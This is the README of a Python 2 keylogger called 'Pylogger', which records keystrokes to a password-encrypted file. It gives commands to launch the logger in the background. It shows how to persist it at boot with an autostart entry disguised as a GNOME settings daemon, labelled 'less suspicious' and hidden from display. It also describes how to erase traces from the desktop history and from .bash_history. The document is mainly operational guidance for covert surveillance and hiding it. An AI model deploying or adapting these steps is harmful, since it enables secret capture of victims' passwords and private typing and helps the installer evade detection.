# Pylogger
An advance keylogger built using python2 that supports encryption of logged keystrokes using password. 

## How to deploy the keylogger?
> Expected deploying time: 2 to 3 mins

- Put the entire folder deep in any directory
- Choose a location to store the output file (keystroke logs)
- The following command fires up the keylogger
```shell
nohup python /location/to/file/pylogger.py [YOUR PASSWORD] /different/location/for/output/sys.conf
```

### To automatically start the keylogger at boot time (in Ubuntu)
- Go to '/etc/xdg/autostart/'
- Create an [less suspicious] entry: 'org.gnome.SettingsDaemon.Sysconfig.desktop'
```shell
sudo gedit /etc/xdg/autostart org.gnome.SettingsDaemon.Sysconfig.desktop
```
- Write the following content in the file
```
[Desktop Entry]
Type=Application
Name=SystemConfig
Exec=nohup python location/to/python/script.py [PASSWORD] /different/location/for/output/sys.conf
NoDisplay=true
Comment=Helper program for starting system apps
X-GNOME-Autostart-enabled=true
```

### For security reason [clearing traces on the system]
- Remove entries from "Recents" ---> ubuntu recents [Settings > Privacy > History]
- Remove your commands from '.bash_history' file ---> terminal history

## License
```
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## Contributing to Pylogger
All pull requests are welcome!

